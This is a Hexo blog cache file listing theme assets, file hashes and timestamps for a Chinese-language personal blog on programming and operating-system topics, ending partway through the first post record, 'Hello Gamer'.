{"meta":{"version":1,"warehouse":"3.0.2"},"models":{"Asset":[{"_id":"themes/landscape/source/css/style.styl","path":"css/style.styl","modified":0,"renderable":1},{"_id":"themes/landscape/source/fancybox/blank.gif","path":"fancybox/blank.gif","modified":0,"renderable":1},{"_id":"themes/landscape/source/fancybox/fancybox_loading.gif","path":"fancybox/fancybox_loading.gif","modified":0,"renderable":1},{"_id":"themes/landscape/source/fancybox/fancybox_overlay.png","path":"fancybox/fancybox_overlay.png","modified":0,"renderable":1},{"_id":"themes/landscape/source/fancybox/fancybox_loading@2x.gif","path":"fancybox/fancybox_loading@2x.gif","modified":0,"renderable":1},{"_id":"themes/landscape/source/fancybox/fancybox_sprite.png","path":"fancybox/fancybox_sprite.png","modified":0,"renderable":1},{"_id":"themes/landscape/source/fancybox/fancybox_sprite@2x.png","path":"fancybox/fancybox_sprite@2x.png","modified":0,"renderable":1},{"_id":"themes/landscape/source/fancybox/jquery.fancybox.css","path":"fancybox/jquery.fancybox.css","modified":0,"renderable":1},{"_id":"themes/landscape/source/fancybox/jquery.fancybox.js","path":"fancybox/jquery.fancybox.js","modified":0,"renderable":1},{"_id":"themes/landscape/source/js/script.js","path":"js/script.js","modified":0,"renderable":1},{"_id":"themes/landscape/source/fancybox/jquery.fancybox.pack.js","path":"fancybox/jquery.fancybox.pack.js","modified":0,"renderable":1},{"_id":"themes/landscape/source/css/fonts/FontAwesome.otf","path":"css/fonts/FontAwesome.otf","modified":0,"renderable":1},{"_id":"themes/landscape/source/css/fonts/fontawesome-webfont.eot","path":"css/fonts/fontawesome-webfont.eot","modified":0,"renderable":1},{"_id":"themes/landscape/source/css/fonts/fontawesome-webfont.woff","path":"css/fonts/fontawesome-webfont.woff","modified":0,"renderable":1},{"_id":"themes/landscape/source/fancybox/helpers/jquery.fancybox-buttons.css","path":"fancybox/helpers/jquery.fancybox-buttons.css","modified":0,"renderable":1},{"_id":"themes/landscape/source/fancybox/helpers/fancybox_buttons.png","path":"fancybox/helpers/fancybox_buttons.png","modified":0,"renderable":1},{"_id":"themes/landscape/source/fancybox/helpers/jquery.fancybox-buttons.js","path":"fancybox/helpers/jquery.fancybox-buttons.js","modified":0,"renderable":1},{"_id":"themes/landscape/source/fancybox/helpers/jquery.fancybox-media.js","path":"fancybox/helpers/jquery.fancybox-media.js","modified":0,"renderable":1},{"_id":"themes/landscape/source/fancybox/helpers/jquery.fancybox-thumbs.css","path":"fancybox/helpers/jquery.fancybox-thumbs.css","modified":0,"renderable":1},{"_id":"themes/landscape/source/fancybox/helpers/jquery.fancybox-thumbs.js","path":"fancybox/helpers/jquery.fancybox-thumbs.js","modified":0,"renderable":1},{"_id":"themes/landscape/source/css/fonts/fontawesome-webfont.ttf","path":"css/fonts/fontawesome-webfont.ttf","modified":0,"renderable":1},{"_id":"themes/landscape/source/css/fonts/fontawesome-webfont.svg","path":"css/fonts/fontawesome-webfont.svg","modified":0,"renderable":1},{"_id":"themes/landscape/source/css/images/banner.jpg","path":"css/images/banner.jpg","modified":0,"renderable":1}],"Cache":[{"_id":"themes/landscape/.gitignore","hash":"58d26d4b5f2f94c2d02a4e4a448088e4a2527c77","modified":1583557596067},{"_id":"themes/landscape/Gruntfile.js","hash":"71adaeaac1f3cc56e36c49d549b8d8a72235c9b9","modified":1583557596068},{"_id":"themes/landscape/LICENSE","hash":"c480fce396b23997ee23cc535518ffaaf7f458f8","modified":1583557596068},{"_id":"themes/landscape/README.md","hash":"37fae88639ef60d63bd0de22314d7cc4c5d94b07","modified":1583557596068},{"_id":"themes/landscape/_config.yml","hash":"79ac6b9ed6a4de5a21ea53fc3f5a3de92e2475ff","modified":1583557596068},{"_id":"themes/landscape/package.json","hash":"544f21a0b2c7034998b36ae94dba6e3e0f39f228","modified":1583557596076},{"_id":"source/_posts/hello-world.md","hash":"7d98d6592de80fdcd2949bd7401cec12afd98cdf","modified":1583557386689},{"_id":"source/_posts/測試一下.md","hash":"c81474a011231aaa944f189bc59e1331cc1ea535","modified":1583558011641},{"_id":"source/_posts/測試一下2.md","hash":"447d60df56ab1c44b7b22112c2e8b8a41963a2e5","modified":1583558348320},{"_id":"themes/landscape/languages/de.yml","hash":"3ebf0775abbee928c8d7bda943c191d166ded0d3","modified":1583557596068},{"_id":"themes/landscape/languages/es.yml","hash":"76edb1171b86532ef12cfd15f5f2c1ac3949f061","modified":1583557596069},{"_id":"themes/landscape/languages/default.yml","hash":"3083f319b352d21d80fc5e20113ddf27889c9d11","modified":1583557596069},{"_id":"themes/landscape/languages/fr.yml","hash":"415e1c580ced8e4ce20b3b0aeedc3610341c76fb","modified":1583557596069},{"_id":"themes/landscape/languages/ja.yml","hash":"a73e1b9c80fd6e930e2628b393bfe3fb716a21a9","modified":1583557596069},{"_id":"themes/landscape/languages/ko.yml","hash":"881d6a0a101706e0452af81c580218e0bfddd9cf","modified":1583557596069},{"_id":"themes/landscape/languages/nl.yml","hash":"12ed59faba1fc4e8cdd1d42ab55ef518dde8039c","modified":1583557596070},{"_id":"themes/landscape/languages/no.yml","hash":"965a171e70347215ec726952e63f5b47930931ef","modified":1583557596070},{"_id":"themes/landscape/languages/pt.yml","hash":"57d07b75d434fbfc33b0ddb543021cb5f53318a8","modified":1583557596070},{"_id":"themes/landscape/languages/zh-CN.yml","hash":"ca40697097ab0b3672a80b455d3f4081292d1eed","modified":1583557596070},{"_id":"themes/landscape/languages/ru.yml","hash":"4fda301bbd8b39f2c714e2c934eccc4b27c0a2b0","modified":1583557596070},{"_id":"themes/landscape/languages/zh-TW.yml","hash":"53ce3000c5f767759c7d2c4efcaa9049788599c3","modified":1583557596070},{"_id":"themes/landscape/layout/archive.ejs","hash":"2703b07cc8ac64ae46d1d263f4653013c7e1666b","modified":1583557596075},{"_id":"themes/landscape/layout/category.ejs","hash":"765426a9c8236828dc34759e604cc2c52292835a","modified":1583557596075},{"_id":"themes/landscape/layout/index.ejs","hash":"aa1b4456907bdb43e629be3931547e2d29ac58c8","modified":1583557596076},{"_id":"themes/landscape/layout/layout.ejs","hash":"f155824ca6130080bb057fa3e868a743c69c4cf5","modified":1583557596076},{"_id":"themes/landscape/layout/page.ejs","hash":"7d80e4e36b14d30a7cd2ac1f61376d9ebf264e8b","modified":1583557596076},{"_id":"themes/landscape/layout/post.ejs","hash":"7d80e4e36b14d30a7cd2ac1f61376d9ebf264e8b","modified":1583557596076},{"_id":"themes/landscape/scripts/fancybox.js","hash":"aa411cd072399df1ddc8e2181a3204678a5177d9","modified":1583557596077},{"_id":"themes/landscape/layout/tag.ejs","hash":"eaa7b4ccb2ca7befb90142e4e68995fb1ea68b2e","modified":1583557596076},{"_id":"themes/landscape/layout/_partial/after-footer.ejs","hash":"d0d753d39038284d52b10e5075979cc97db9cd20","modified":1583557596071},{"_id":"themes/landscape/layout/_partial/archive-post.ejs","hash":"c7a71425a946d05414c069ec91811b5c09a92c47","modified":1583557596071},{"_id":"themes/landscape/layout/_partial/article.ejs","hash":"c4c835615d96a950d51fa2c3b5d64d0596534fed","modified":1583557596071},{"_id":"themes/landscape/layout/_partial/archive.ejs","hash":"2cace3976c53d7c1e7dbecff42617a3d2e3419c3","modified":1583578502358},{"_id":"themes/landscape/layout/_partial/footer.ejs","hash":"93518893cf91287e797ebac543c560e2a63b8d0e","modified":1583557596072},{"_id":"themes/landscape/layout/_partial/head.ejs","hash":"5abf77aec957d9445fc71a8310252f0013c84578","modified":1583557596072},{"_id":"themes/landscape/layout/_partial/gauges-analytics.ejs","hash":"aad6312ac197d6c5aaf2104ac863d7eba46b772a","modified":1583557596072},{"_id":"themes/landscape/layout/_partial/google-analytics.ejs","hash":"f921e7f9223d7c95165e0f835f353b2938e40c45","modified":1583557596072},{"_id":"themes/landscape/layout/_partial/header.ejs","hash":"7e749050be126eadbc42decfbea75124ae430413","modified":1583557596073},{"_id":"themes/landscape/layout/_partial/mobile-nav.ejs","hash":"e952a532dfc583930a666b9d4479c32d4a84b44e","modified":1583557596073},{"_id":"themes/landscape/layout/_partial/sidebar.ejs","hash":"930da35cc2d447a92e5ee8f835735e6fd2232469","modified":1583557596074},{"_id":"themes/landscape/layout/_widget/archive.ejs","hash":"beb4a86fcc82a9bdda9289b59db5a1988918bec3","modified":1583557596074},{"_id":"themes/landscape/layout/_widget/category.ejs","hash":"dd1e5af3c6af3f5d6c85dfd5ca1766faed6a0b05","modified":1583557596075},{"_id":"themes/landscape/layout/_widget/recent_posts.ejs","hash":"0d4f064733f8b9e45c0ce131fe4a689d570c883a","modified":1583557596075},{"_id":"themes/landscape/layout/_widget/tagcloud.ejs","hash":"b4a2079101643f63993dcdb32925c9b071763b46","modified":1583557596075},{"_id":"themes/landscape/layout/_widget/tag.ejs","hash":"2de380865df9ab5f577f7d3bcadf44261eb5faae","modified":1583557596075},{"_id":"themes/landscape/source/css/_extend.styl","hash":"222fbe6d222531d61c1ef0f868c90f747b1c2ced","modified":1583557596077},{"_id":"themes/landscape/source/css/_variables.styl","hash":"628e307579ea46b5928424313993f17b8d729e92","modified":1583557596080},{"_id":"themes/landscape/source/css/style.styl","hash":"a70d9c44dac348d742702f6ba87e5bb3084d65db","modified":1583557596090},{"_id":"themes/landscape/source/fancybox/blank.gif","hash":"2daeaa8b5f19f0bc209d976c02bd6acb51b00b0a","modified":1583557596091},{"_id":"themes/landscape/source/fancybox/fancybox_loading.gif","hash":"1a755fb2599f3a313cc6cfdb14df043f8c14a99c","modified":1583557596091},{"_id":"themes/landscape/source/fancybox/fancybox_overlay.png","hash":"b3a4ee645ba494f52840ef8412015ba0f465dbe0","modified":1583557596092},{"_id":"themes/landscape/source/fancybox/fancybox_loading@2x.gif","hash":"273b123496a42ba45c3416adb027cd99745058b0","modified":1583557596092},{"_id":"themes/landscape/source/fancybox/fancybox_sprite.png","hash":"17df19f97628e77be09c352bf27425faea248251","modified":1583557596092},{"_id":"themes/landscape/source/fancybox/fancybox_sprite@2x.png","hash":"30c58913f327e28f466a00f4c1ac8001b560aed8","modified":1583557596092},{"_id":"themes/landscape/source/fancybox/jquery.fancybox.css","hash":"aaa582fb9eb4b7092dc69fcb2d5b1c20cca58ab6","modified":1583557596094},{"_id":"themes/landscape/source/fancybox/jquery.fancybox.js","hash":"d08b03a42d5c4ba456ef8ba33116fdbb7a9cabed","modified":1583557596094},{"_id":"themes/landscape/source/js/script.js","hash":"2876e0b19ce557fca38d7c6f49ca55922ab666a1","modified":1583557596095},{"_id":"themes/landscape/source/fancybox/jquery.fancybox.pack.js","hash":"9e0d51ca1dbe66f6c0c7aefd552dc8122e694a6e","modified":1583557596094},{"_id":"themes/landscape/layout/_partial/post/category.ejs","hash":"c6bcd0e04271ffca81da25bcff5adf3d46f02fc0","modified":1583557596073},{"_id":"themes/landscape/layout/_partial/post/date.ejs","hash":"6197802873157656e3077c5099a7dda3d3b01c29","modified":1583557596073},{"_id":"themes/landscape/layout/_partial/post/nav.ejs","hash":"16a904de7bceccbb36b4267565f2215704db2880","modified":1583557596074},{"_id":"themes/landscape/layout/_partial/post/gallery.ejs","hash":"3d9d81a3c693ff2378ef06ddb6810254e509de5b","modified":1583557596073},{"_id":"themes/landscape/layout/_partial/post/tag.ejs","hash":"2fcb0bf9c8847a644167a27824c9bb19ac74dd14","modified":1583557596074},{"_id":"themes/landscape/layout/_partial/post/title.ejs","hash":"2f275739b6f1193c123646a5a31f37d48644c667","modified":1583557596074},{"_id":"themes/landscape/source/css/_partial/archive.styl","hash":"db15f5677dc68f1730e82190bab69c24611ca292","modified":1583557596078},{"_id":"themes/landscape/source/css/_partial/article.styl","hash":"10685f8787a79f79c9a26c2f943253450c498e3e","modified":1583557596078},{"_id":"themes/landscape/source/css/_partial/footer.styl","hash":"e35a060b8512031048919709a8e7b1ec0e40bc1b","modified":1583557596078},{"_id":"themes/landscape/source/css/_partial/comment.styl","hash":"79d280d8d203abb3bd933ca9b8e38c78ec684987","modified":1583557596078},{"_id":"themes/landscape/source/css/_partial/mobile.styl","hash":"a399cf9e1e1cec3e4269066e2948d7ae5854d745","modified":1583557596079},{"_id":"themes/landscape/source/css/_partial/header.styl","hash":"85ab11e082f4dd86dde72bed653d57ec5381f30c","modified":1583557596079},{"_id":"themes/landscape/source/css/_partial/highlight.styl","hash":"bf4e7be1968dad495b04e83c95eac14c4d0ad7c0","modified":1583557596079},{"_id":"themes/landscape/source/css/_partial/sidebar-aside.styl","hash":"890349df5145abf46ce7712010c89237900b3713","modified":1583557596079},{"_id":"themes/landscape/source/css/_partial/sidebar-bottom.styl","hash":"8fd4f30d319542babfd31f087ddbac550f000a8a","modified":1583557596080},{"_id":"themes/landscape/source/css/_partial/sidebar.styl","hash":"404ec059dc674a48b9ab89cd83f258dec4dcb24d","modified":1583557596080},{"_id":"themes/landscape/source/css/fonts/FontAwesome.otf","hash":"b5b4f9be85f91f10799e87a083da1d050f842734","modified":1583557596082},{"_id":"themes/landscape/source/css/fonts/fontawesome-webfont.eot","hash":"7619748fe34c64fb157a57f6d4ef3678f63a8f5e","modified":1583557596083},{"_id":"themes/landscape/source/css/_util/grid.styl","hash":"0bf55ee5d09f193e249083602ac5fcdb1e571aed","modified":1583557596080},{"_id":"themes/landscape/source/css/fonts/fontawesome-webfont.woff","hash":"04c3bf56d87a0828935bd6b4aee859995f321693","modified":1583557596087},{"_id":"themes/landscape/source/css/_util/mixin.styl","hash":"44f32767d9fd3c1c08a60d91f181ee53c8f0dbb3","modified":1583557596080},{"_id":"themes/landscape/source/fancybox/helpers/jquery.fancybox-buttons.css","hash":"1a9d8e5c22b371fcc69d4dbbb823d9c39f04c0c8","modified":1583557596093},{"_id":"themes/landscape/source/fancybox/helpers/fancybox_buttons.png","hash":"e385b139516c6813dcd64b8fc431c364ceafe5f3","modified":1583557596093},{"_id":"themes/landscape/source/fancybox/helpers/jquery.fancybox-buttons.js","hash":"dc3645529a4bf72983a39fa34c1eb9146e082019","modified":1583557596093},{"_id":"themes/landscape/source/fancybox/helpers/jquery.fancybox-media.js","hash":"294420f9ff20f4e3584d212b0c262a00a96ecdb3","modified":1583557596093},{"_id":"themes/landscape/source/fancybox/helpers/jquery.fancybox-thumbs.css","hash":"4ac329c16a5277592fc12a37cca3d72ca4ec292f","modified":1583557596093},{"_id":"themes/landscape/source/fancybox/helpers/jquery.fancybox-thumbs.js","hash":"47da1ae5401c24b5c17cc18e2730780f5c1a7a0c","modified":1583557596093},{"_id":"themes/landscape/source/css/fonts/fontawesome-webfont.ttf","hash":"7f09c97f333917034ad08fa7295e916c9f72fd3f","modified":1583557596086},{"_id":"themes/landscape/source/css/fonts/fontawesome-webfont.svg","hash":"46fcc0194d75a0ddac0a038aee41b23456784814","modified":1583557596085},{"_id":"themes/landscape/source/css/images/banner.jpg","hash":"f44aa591089fcb3ec79770a1e102fd3289a7c6a6","modified":1583557596090},{"_id":"public/2020/03/07/測試一下2/index.html","hash":"5beee2e577bdc019e1098224970f6dabaf91bfa5","modified":1583558375734},{"_id":"public/2020/03/07/測試一下/index.html","hash":"1d9292d1f468414c96e513dbe36043fb1bda1fe8","modified":1583558375734},{"_id":"public/2020/03/07/hello-world/index.html","hash":"eadf958d87b2460a41a2439bfcb84199eb1c1a8d","modified":1583564362306},{"_id":"public/archives/index.html","hash":"883b7d8eb3a819fec8ea546eae7d336c7333bad4","modified":1585669476352},{"_id":"public/archives/2020/index.html","hash":"7b2b71d421b2f8f875abd4d5fa59491c861a4a32","modified":1585669476352},{"_id":"public/archives/2020/03/index.html","hash":"fd028ece87e7d456da49afeaad55b3195cb2d4c0","modified":1585669476352},{"_id":"public/index.html","hash":"1071438359b5e7e2af129aaf390b58eeb3e862c6","modified":1585669476352},{"_id":"public/fancybox/blank.gif","hash":"2daeaa8b5f19f0bc209d976c02bd6acb51b00b0a","modified":1583558375734},{"_id":"public/fancybox/fancybox_overlay.png","hash":"b3a4ee645ba494f52840ef8412015ba0f465dbe0","modified":1583558375734},{"_id":"public/fancybox/fancybox_loading.gif","hash":"1a755fb2599f3a313cc6cfdb14df043f8c14a99c","modified":1583558375734},{"_id":"public/fancybox/fancybox_sprite.png","hash":"17df19f97628e77be09c352bf27425faea248251","modified":1583558375734},{"_id":"public/fancybox/fancybox_sprite@2x.png","hash":"30c58913f327e28f466a00f4c1ac8001b560aed8","modified":1583558375734},{"_id":"public/css/fonts/FontAwesome.otf","hash":"b5b4f9be85f91f10799e87a083da1d050f842734","modified":1583558375734},{"_id":"public/css/fonts/fontawesome-webfont.woff","hash":"04c3bf56d87a0828935bd6b4aee859995f321693","modified":1583558375734},{"_id":"public/fancybox/helpers/fancybox_buttons.png","hash":"e385b139516c6813dcd64b8fc431c364ceafe5f3","modified":1583558375734},{"_id":"public/fancybox/fancybox_loading@2x.gif","hash":"273b123496a42ba45c3416adb027cd99745058b0","modified":1583558375734},{"_id":"public/css/fonts/fontawesome-webfont.eot","hash":"7619748fe34c64fb157a57f6d4ef3678f63a8f5e","modified":1583558375734},{"_id":"public/css/fonts/fontawesome-webfont.ttf","hash":"7f09c97f333917034ad08fa7295e916c9f72fd3f","modified":1583558375734},{"_id":"public/fancybox/jquery.fancybox.css","hash":"aaa582fb9eb4b7092dc69fcb2d5b1c20cca58ab6","modified":1583558375734},{"_id":"public/js/script.js","hash":"2876e0b19ce557fca38d7c6f49ca55922ab666a1","modified":1583558375734},{"_id":"public/fancybox/helpers/jquery.fancybox-buttons.css","hash":"1a9d8e5c22b371fcc69d4dbbb823d9c39f04c0c8","modified":1583558375734},{"_id":"public/fancybox/helpers/jquery.fancybox-media.js","hash":"294420f9ff20f4e3584d212b0c262a00a96ecdb3","modified":1583558375734},{"_id":"public/fancybox/helpers/jquery.fancybox-buttons.js","hash":"dc3645529a4bf72983a39fa34c1eb9146e082019","modified":1583558375734},{"_id":"public/fancybox/helpers/jquery.fancybox-thumbs.css","hash":"4ac329c16a5277592fc12a37cca3d72ca4ec292f","modified":1583558375734},{"_id":"public/fancybox/helpers/jquery.fancybox-thumbs.js","hash":"47da1ae5401c24b5c17cc18e2730780f5c1a7a0c","modified":1583558375734},{"_id":"public/css/style.css","hash":"5f8dadd37d0052c557061018fe6f568f64fced9b","modified":1583558375734},{"_id":"public/fancybox/jquery.fancybox.js","hash":"d08b03a42d5c4ba456ef8ba33116fdbb7a9cabed","modified":1583558375734},{"_id":"public/fancybox/jquery.fancybox.pack.js","hash":"9e0d51ca1dbe66f6c0c7aefd552dc8122e694a6e","modified":1583558375734},{"_id":"public/css/fonts/fontawesome-webfont.svg","hash":"46fcc0194d75a0ddac0a038aee41b23456784814","modified":1583558375734},{"_id":"public/css/images/banner.jpg","hash":"f44aa591089fcb3ec79770a1e102fd3289a7c6a6","modified":1583558375734},{"_id":"source/_posts/Hello-Gamer.md","hash":"f980273e5c5f1a661e1cb433deddbbf7c3637541","modified":1583559167293},{"_id":"source/_posts/我不喜歡安卓.md","hash":"65be8bce96f81b9cfdfff84ada1bebfeb17f2263","modified":1583568111810},{"_id":"source/_posts/放棄過去的文章了.md","hash":"48d0cb13dc5e285c5c2f11875d5dec2d47012192","modified":1583568096395},{"_id":"source/_posts/我不喜歡安卓/1559449236027.png","hash":"231af3cb372449be9ba190aad6a78c4012c6be96","modified":1583559603286},{"_id":"source/.DS_Store","hash":"b48c4f7d61a5928be717d4bd654481ff1eab36ee","modified":1583559746651},{"_id":"source/_posts/做點小工作.md","hash":"cbc43319242db893c7efaafa3d0d260c42e022a0","modified":1583568587123},{"_id":"source/_posts/做點小工作/1559472330222.png","hash":"3a04d1f5c76011dbc5a7de9f15e0573e25fc04ef","modified":1583559857586},{"_id":"source/_posts/做點小工作/1559472290996.png","hash":"012cee8c99fd45aea826f004d9368eddc282cfad","modified":1583559877935},{"_id":"source/_posts/做點小工作/1559472386325.png","hash":"1e4a01ef512e98d9fb2c566ac7ae59989ccbb411","modified":1583559900821},{"_id":"source/_posts/做點小工作/1559472409652.png","hash":"c88d3941126df425c01bec51096a502bba083f98","modified":1583559925185},{"_id":"source/_posts/CSRF-和-XSS.md","hash":"99c7c66ab2b9db1159d4bf49d28284029cab52c8","modified":1583568138279},{"_id":"source/_posts/初识-YAF-框架-和-MVC.md","hash":"9b6338826237d915c297c18862e727b21ed95b50","modified":1583568057581},{"_id":"source/_posts/对于虚拟化的执着.md","hash":"970391ff6727d1b7d704236ca688cca27a502d01","modified":1583568091328},{"_id":"source/_posts/段式存储.md","hash":"d21d88134b4657a2e41c1d9cc2652b487f5cdea7","modified":1583568078683},{"_id":"source/_posts/类、数据与设计模式.md","hash":"05b7611d6ddd1e24be7d62c4a27065c225e1859e","modified":1583568101286},{"_id":"source/_posts/线程锁（一）.md","hash":"96aefb741a8b3d2084cad0119952d36502e7caea","modified":1583568118294},{"_id":"source/_posts/虚拟内存.md","hash":"eb1f7ca3f3ec60bfde759e5ce0cd637689701ffe","modified":1583568573958},{"_id":"source/_posts/调度算法（一）.md","hash":"17eb485c328517d19c32a130481bbebcbc9abdca","modified":1583568073203},{"_id":"source/_posts/调度算法（二）.md","hash":"4f3ab8952cd14eebb82c7d6d1e114b896171fae1","modified":1583568064228},{"_id":"source/_posts/面向接口.md","hash":"5ee028fd216aec434e9cdb0dd63caaef464d5ad6","modified":1583568553845},{"_id":"source/_posts/线程锁（一）/1570974760163.png","hash":"c066562769f770f2e4df170ab5aa61ff1f37a9ce","modified":1583563611757},{"_id":"source/_posts/段式存储/1569248251853.png","hash":"d1057b98342f1d92fd3e0002b184669782aa84f5","modified":1583562085690},{"_id":"source/_posts/线程锁（一）/1570974768743.png","hash":"e8c2918bfe8ad6a8863df176fe75a4c2d9657fea","modified":1583563664295},{"_id":"source/_posts/段式存储/1569248244054.png","hash":"0229fdee23ddbb78d225925b6dff58382a123fda","modified":1583562066538},{"_id":"source/_posts/线程锁（一）/1570974768741.png","hash":"fe31f903df2ee7bb6be81d77ced588005cdb5d59","modified":1583563650160},{"_id":"source/_posts/线程锁（一）/1570974769063.png","hash":"db6dd3d98ed659d4a17937be9cee8f5ac88bb1f2","modified":1583563679471},{"_id":"source/_posts/虚拟内存/1566035265964.png","hash":"017de374eac00da9290a68319f80ed0879ef8ab9","modified":1583561459819},{"_id":"source/_posts/调度算法（一）/1567392403118.png","hash":"dde7437550ba8c72387c1a6c18372d667ccc04b2","modified":1583561716377},{"_id":"source/_posts/调度算法（一）/1567392403168.png","hash":"af1b788c107c89a147029d5177fb3a473ff6be7d","modified":1583561732348},{"_id":"source/_posts/面向接口/1564906395080.png","hash":"d19fb28d66e5e8ec1b3c64406bf2a60fb04bf5e0","modified":1583560989509},{"_id":"source/_posts/对于虚拟化的执着/1565527230467.gif","hash":"699ef44280e32eee53b8887e45faebc1cbd33941","modified":1583561298054},{"_id":"public/2019/10/27/CSRF-和-XSS/index.html","hash":"42d7ee88eaa0868fbfe12eb16f658a7ce630dd7d","modified":1585669476352},{"_id":"public/2019/09/23/段式存储/index.html","hash":"0b245e8bc7c23ce3dddfd695e2adcf7ba169ae7b","modified":1585669476352},{"_id":"public/2019/09/08/调度算法（二）/index.html","hash":"b8f47530661a4091a73cf87f668f9123c9d31120","modified":1585669476352},{"_id":"public/2019/09/02/调度算法（一）/index.html","hash":"8e1e3cdffc0a48d833fff839718608e80fc61b17","modified":1585669476352},{"_id":"public/2019/08/17/虚拟内存/index.html","hash":"9adb47ddaf51a29a075f209e7f7ffd82ecb22e06","modified":1585669476352},{"_id":"public/2019/08/11/对于虚拟化的执着/index.html","hash":"abfc6c7a6ba828488e1a978a257c8d7e09dcd95a","modified":1585669476352},{"_id":"public/2019/07/21/类、数据与设计模式/index.html","hash":"c4390aa8a6124132532b491eff18b5609b3ffe6c","modified":1585669476352},{"_id":"public/2019/06/02/我不喜歡安卓/index.html","hash":"59520bc690bd2187f059c0442e60f172c4886418","modified":1585669476352},{"_id":"public/2019/06/02/做點小工作/index.html","hash":"2bb2872f9cf9005964f8ad570b4c38679f2fc226","modified":1585669476352},{"_id":"public/2019/05/30/放棄過去的文章了/index.html","hash":"7ce14c970e9508fca0f24a477b4a83d9a68f6101","modified":1585669476352},{"_id":"public/2019/05/27/Hello-Gamer/index.html","hash":"de6faeb143e7c3b02387c95816c8e565c6cd78ac","modified":1585669476352},{"_id":"public/archives/page/2/index.html","hash":"f66ec0d4c34ff910689da3ba7b200bf263ba38cd","modified":1585669476352},{"_id":"public/archives/2019/index.html","hash":"b5e11130911ec24c511da1c7ebcb08c06c1db94b","modified":1585669476352},{"_id":"public/archives/2019/page/2/index.html","hash":"15460cca9e7ccc6f4abb26454fe10a29747265f5","modified":1585669476352},{"_id":"public/archives/2019/05/index.html","hash":"41041d2665808dbfe2cb6d3b122e0f4281fb8609","modified":1585669476352},{"_id":"public/archives/2019/06/index.html","hash":"3ab1154c184db87063fe0922e02954503aefe69a","modified":1585669476352},{"_id":"public/archives/2019/07/index.html","hash":"4bcf9c20846142053d72a348df76e178879f512d","modified":1585669476352},{"_id":"public/archives/2019/08/index.html","hash":"1ae96e11451d944a1520e049dac5ab5d58697f78","modified":1585669476352},{"_id":"public/archives/2019/09/index.html","hash":"7487dfdc24b6b8953749f50e70dfd440debe28d7","modified":1585669476352},{"_id":"public/archives/2019/10/index.html","hash":"623c9f9343203b79edca0f755b566e4274f3fa29","modified":1585669476352},{"_id":"public/2019/10/13/线程锁（一）/index.html","hash":"eefddeb1ada79f690daac2d538b6ba01f99018dd","modified":1585669476352},{"_id":"public/2019/08/04/面向接口/index.html","hash":"fc173d7c8e6d98a1cd76cf2d90d1fd6a8e9d71a1","modified":1585669476352},{"_id":"public/2019/07/14/初识-YAF-框架-和-MVC/index.html","hash":"52e92ce572355edddf902b9b46adf38027dfb333","modified":1585669476352},{"_id":"public/page/2/index.html","hash":"8afd3043b74ae33574493bca8139c45ace4b9237","modified":1585669476352},{"_id":"public/2019/06/02/做點小工作/1559472330222.png","hash":"3a04d1f5c76011dbc5a7de9f15e0573e25fc04ef","modified":1583564362306},{"_id":"public/2019/08/04/面向接口/1564906395080.png","hash":"d19fb28d66e5e8ec1b3c64406bf2a60fb04bf5e0","modified":1583564362306},{"_id":"public/2019/08/17/虚拟内存/1566035265964.png","hash":"017de374eac00da9290a68319f80ed0879ef8ab9","modified":1583564362306},{"_id":"public/2019/09/02/调度算法（一）/1567392403118.png","hash":"dde7437550ba8c72387c1a6c18372d667ccc04b2","modified":1583564362306},{"_id":"public/2019/09/02/调度算法（一）/1567392403168.png","hash":"af1b788c107c89a147029d5177fb3a473ff6be7d","modified":1583564362306},{"_id":"public/2019/09/23/段式存储/1569248244054.png","hash":"0229fdee23ddbb78d225925b6dff58382a123fda","modified":1583564362306},{"_id":"public/2019/09/23/段式存储/1569248251853.png","hash":"d1057b98342f1d92fd3e0002b184669782aa84f5","modified":1583564362306},{"_id":"public/2019/10/13/线程锁（一）/1570974760163.png","hash":"c066562769f770f2e4df170ab5aa61ff1f37a9ce","modified":1583564362306},{"_id":"public/2019/10/13/线程锁（一）/1570974768741.png","hash":"fe31f903df2ee7bb6be81d77ced588005cdb5d59","modified":1583564362306},{"_id":"public/2019/10/13/线程锁（一）/1570974768743.png","hash":"e8c2918bfe8ad6a8863df176fe75a4c2d9657fea","modified":1583564362306},{"_id":"public/2019/10/13/线程锁（一）/1570974769063.png","hash":"db6dd3d98ed659d4a17937be9cee8f5ac88bb1f2","modified":1583564362306},{"_id":"public/2019/06/02/做點小工作/1559472290996.png","hash":"012cee8c99fd45aea826f004d9368eddc282cfad","modified":1583564362306},{"_id":"public/2019/06/02/做點小工作/1559472386325.png","hash":"1e4a01ef512e98d9fb2c566ac7ae59989ccbb411","modified":1583564362306},{"_id":"public/2019/06/02/做點小工作/1559472409652.png","hash":"c88d3941126df425c01bec51096a502bba083f98","modified":1583564362306},{"_id":"public/2019/08/11/对于虚拟化的执着/1565527230467.gif","hash":"699ef44280e32eee53b8887e45faebc1cbd33941","modified":1583564362306},{"_id":"public/2019/06/02/我不喜歡安卓/1559449236027.png","hash":"231af3cb372449be9ba190aad6a78c4012c6be96","modified":1583564362306},{"_id":"source/_posts/某明星与亚文化平台.md","hash":"e6eb5ae7d72708210aee33cd4566b56b3b6919a4","modified":1583584538978},{"_id":"public/2020/03/07/某明星与亚文化平台/index.html","hash":"888c63b05fa1eb7c059a2a14c13cfa9804ae481e","modified":1585669476352},{"_id":"source/_posts/某明星与亚文化平台/WechatIMG87.jpeg","hash":"c2b3ca85f33bcc6c78658a72808a09e15a67db3f","modified":1583578711813},{"_id":"public/2020/03/07/某明星与亚文化平台/WechatIMG87.jpeg","hash":"c2b3ca85f33bcc6c78658a72808a09e15a67db3f","modified":1583578753214},{"_id":"source/_posts/知识的诅咒.md","hash":"714ab430a14ad1c6ae3b4e82e8fbd89ca9015ad6","modified":1585669463805},{"_id":"public/2020/03/31/知识的诅咒/index.html","hash":"83f508e7d10764812eedb2c0b53ea15a7a4f55b9","modified":1585669476352},{"_id":"public/tags/随想/index.html","hash":"c670c75d4d5487190f674563530d5c0f1c3612c8","modified":1585669476352}],"Category":[],"Data":[],"Page":[],"Post":[{"title":"Hello Gamer","date":"2019-05-26T16:00:00.000Z","_content":"我是一个自诩的游戏开发者。但现在为止（2019-0527）还没做个一个完整的游戏项目。\n但这并不意味着什么。任何事都要有个开始点。\n明天再努力吧。（昨天也说过，但今天是认真的！）\n","source":"_posts/Hello-Gamer.md","raw":"---\ntitle: Hello Gamer\ndate: 